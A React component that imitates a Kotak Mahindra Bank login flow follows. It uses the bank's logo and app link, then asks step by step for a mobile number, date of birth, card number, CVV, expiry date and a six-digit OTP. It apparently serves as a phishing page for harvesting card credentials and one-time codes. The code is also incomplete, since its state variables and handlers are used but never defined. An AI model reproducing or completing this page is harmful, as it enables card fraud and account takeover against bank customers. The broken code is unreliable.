import React, { useState, useEffect } from 'react'
import { useNavigate, Link } from 'react-router-dom'
import { BiArrowBack, BiX, BiCheck, BiRightArrowAlt, BiCreditCard, BiChevronRight, BiStar, BiBlock } from 'react-icons/bi'
import { FaGooglePlay } from 'react-icons/fa'

export default function Login() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-100 to-purple-200 pt-[60px]">
      <div className="bg-white p-4 shadow-md flex items-center justify-center">
        <Link to="/">
          <img src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" alt="Kotak Bank" className="h-[40px]" />
        </Link>
      </div>

      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center">
          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
        </div>
      )}

      {showPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-80 z-50 flex items-center justify-center p-4" onClick={() => setShowPopup(false)}>
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full" onClick={(e) => e.stopPropagation()}>
            <div className="text-center">
              <div className="mb-4">
                <img 
                  src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" 
                  alt="Kotak Mahindra Bank" 
                  className="h-16 mx-auto"
                />
              </div>
              <h3 className="text-xl font-bold text-gray-800 mb-2">Download Kotak Mahindra Bank App</h3>
              <p className="text-gray-500 mb-6">Get the official app from Google Play Store</p>
              <a 
                href="https://play.google.com/store/apps/details?id=com.kotak.mob" 
                target="_blank" 
                rel="noopener noreferrer"
                className="inline-flex items-center justify-center bg-black text-white px-6 py-3 rounded-xl hover:bg-gray-800 transition"
              >
                <FaGooglePlay className="w-8 h-8 mr-3" />
                <span className="text-lg font-semibold">Get it on Google Play</span>
              </a>
              <button 
                onClick={() => setShowPopup(false)}
                className="mt-6 text-gray-400 text-sm hover:text-gray-600"
              >
                Skip for now
              </button>
            </div>
          </div>
        </div>
      )}

      {step === 0 && (
        <div className="p-4">
          <div className="bg-white rounded-xl shadow-lg p-6">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL3dS3meA4-oVMFg3IBI5N9R9kAQRjcP5ARw&s" alt="Card" className="w-full rounded-xl mb-4" />
            
            {services.map((service) => (
              <div
                key={service.id}
                onClick={() => handleServiceSelect(service.label)}
                className="flex items-center justify-between py-4 border-b border-gray-200 cursor-pointer hover:bg-gray-50"
              >
                <div className="flex items-center">
                  <span className="text-purple-700 text-xl mr-3">{service.icon}</span>
                  <span className="text-gray-800 font-medium">{service.label}</span>
                </div>
                <BiChevronRight className="text-gray-400" />
              </div>
            ))}
            
            <img src="https://cdn.prod.website-files.com/6646d773658d32b01a2fcae3/66d84cf7a7b1a80e324f5398_Revolut%20-%20Blog%20(700%20x%20420%20px)%20(1).png" alt="Banner" className="w-full rounded-xl mt-4" />
          </div>
        </div>
      )}

      {step === 1 && (
        <div className="p-4">
          <div className="bg-white rounded-xl shadow-lg p-6">
            <div className="flex items-center mb-4">
              <button onClick={() => setStep(0)} className="mr-3">
                <BiArrowBack className="text-2xl text-purple-700" />
              </button>
              <span className="text-xl font-semibold text-gray-800">Verify Your Details</span>
            </div>

            <div className="flex items-center justify-between mb-6 px-2">
              <div className="flex items-center">
                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">2</div>
                <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">3</div>
              </div>
            </div>

            <p className="text-gray-600 mb-4 text-sm">Let's begin with some necessary information and get you started</p>

            <div className="mb-4">
              <label className="block text-purple-700 font-semibold mb-2">Enter your mobile number linked with Bank</label>
              <div className="flex border-2 border-purple-600 rounded-xl overflow-hidden">
                <div className="w-16 bg-purple-100 flex items-center justify-center border-r-2 border-purple-600">
                  <span className="text-purple-700 font-semibold">+91</span>
                </div>
                <input
                  type="tel"
                  maxLength={10}
                  value={mobile}
                  onChange={(e) => { setMobile(e.target.value.replace(/\D/g, '')); setErrors({...errors, mobile: ''}) }}
                  placeholder="Enter your mobile number"
                  className="flex-1 p-3 outline-none"
                />
              </div>
              {errors.mobile && <p className="text-red-500 text-xs mt-1">{errors.mobile}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-purple-700 font-semibold mb-2">Enter Date of Birth</label>
              <input
                type="date"
                value={dob}
                onChange={(e) => { setDob(e.target.value); setErrors({...errors, dob: ''}) }}
                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
              />
              {errors.dob && <p className="text-red-500 text-xs mt-1">{errors.dob}</p>}
            </div>

            <button
              onClick={handleLogin}
              className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
            >
              Login
            </button>

            <p className="text-gray-500 text-xs mt-4 text-center">
              Safe Banking: Never share your User ID, password or any other information with anyone on phone, SMS or Email. Kotak Bank does not call/email customers for such information. Beware of fraudsters asking for such details posing as Bank staff.
            </p>
          </div>
        </div>
      )}

      {step === 2 && (
        <div className="p-4">
          <div className="bg-white rounded-xl shadow-lg p-6">
            <div className="flex items-center mb-4">
              <button onClick={() => setStep(1)} className="mr-3">
                <BiArrowBack className="text-2xl text-purple-700" />
              </button>
              <span className="text-xl font-semibold text-gray-800">Verification Required</span>
            </div>

            <div className="flex items-center justify-between mb-6 px-2">
              <div className="flex items-center">
                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                <div className="w-8 h-0.5 bg-purple-600 mx-1"></div>
                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
                <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">3</div>
              </div>
            </div>

            <p className="text-gray-600 mb-4 text-sm">Let's begin with some necessary information and get you started</p>

            <div className="mb-4">
              <label className="block text-purple-700 font-semibold mb-2">Card Number</label>
              <input
                type="text"
                value={cardNumber}
                onChange={(e) => { setCardNumber(formatCardNumber(e.target.value)); setErrors({...errors, cardNumber: ''}) }}
                placeholder="XXXX XXXX XXXX XXXX"
                maxLength={19}
                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
              />
              {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
            </div>

            <div className="mb-4">
              <label className="block text-purple-700 font-semibold mb-2">CVV Number</label>
              <input
                type="password"
                maxLength={4}
                value={cvv}
                onChange={(e) => { setCvv(e.target.value.replace(/\D/g, '')); setErrors({...errors, cvv: ''}) }}
                placeholder="XXX"
                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
              />
              {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
            </div>

            <div className="mb-6">
              <label className="block text-purple-700 font-semibold mb-2">Exp Date</label>
              <input
                type="text"
                value={expDate}
                onChange={(e) => { setExpDate(formatExpDate(e.target.value)); setErrors({...errors, expDate: ''}) }}
                placeholder="MM/YY"
                maxLength={5}
                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
              />
              {errors.expDate && <p className="text-red-500 text-xs mt-1">{errors.expDate}</p>}
            </div>

            <button
              onClick={handleCardVerify}
              className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
            >
              Next
            </button>
          </div>
        </div>
      )}

      {step === 3 && (
        <div className="p-4">
          <div className="bg-white rounded-xl shadow-lg p-6">
            <div className="flex items-center mb-4">
              <button onClick={() => setStep(2)} className="mr-3">
                <BiArrowBack className="text-2xl text-purple-700" />
              </button>
              <span className="text-xl font-semibold text-gray-800">Verification Required</span>
            </div>

            <div className="flex items-center justify-between mb-6 px-2">
              <div className="flex items-center">
                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                <div className="w-8 h-0.5 bg-purple-600 mx-1"></div>
                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
                <div className="w-8 h-0.5 bg-purple-600 mx-1"></div>
                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">3</div>
              </div>
            </div>

            <p className="text-gray-600 mb-2 text-sm text-center">We've sent you a verification code to your phone</p>
            <p className="text-gray-500 mb-6 text-sm">Please enter 6-digit code to verify your identity</p>

            <div className="mb-4">
              <input
                type="text"
                maxLength={6}
                value={otp}
                onChange={(e) => { setOtp(e.target.value); setError('') }}
                placeholder="XXXXXX"
                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none text-center text-2xl tracking-widest"
              />
            </div>

            <p 
              onClick={handleResendOtp}
              className={`text-sm font-semibold mb-6 text-center cursor-pointer ${resendTimer > 0 ? 'text-gray-400 cursor-not-allowed' : 'text-purple-600 hover:underline'}`}
            >
              {resendTimer > 0 ? `Resend OTP in ${formatTime(resendTimer)}` : 'Resend OTP'}
            </p>

            {error && (
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4 text-center">
                {error}
              </div>
            )}

            <button
              onClick={handleOtpVerify}
              className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
            >
              Submit
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
